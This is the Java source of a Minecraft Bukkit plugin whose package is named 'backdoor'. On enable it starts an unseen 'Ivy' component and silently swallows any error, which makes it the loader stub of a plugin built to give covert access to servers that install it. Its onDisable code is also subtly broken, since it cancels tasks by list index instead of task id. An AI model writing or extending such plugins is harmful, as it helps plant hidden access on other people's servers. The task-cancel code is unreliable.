

// Author: Dashie
// Version: 1.0


package com.backdoor;


import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitWorker;
import org.bukkit.Bukkit;


public class DashIvy extends JavaPlugin
{
    @Override
    public void onEnable()       
    { 
        try 
        { 
            Ivy.start(this); 
        } 
        
        catch (Exception e) 
        {} 
    };
    
    @Override
    public void onDisable() 
    {
        for(BukkitWorker runnable : Bukkit.getScheduler().getActiveWorkers())
        {
            Bukkit.getScheduler().cancelTask(Bukkit.getScheduler().getActiveWorkers().indexOf(runnable));
        };
    };
};
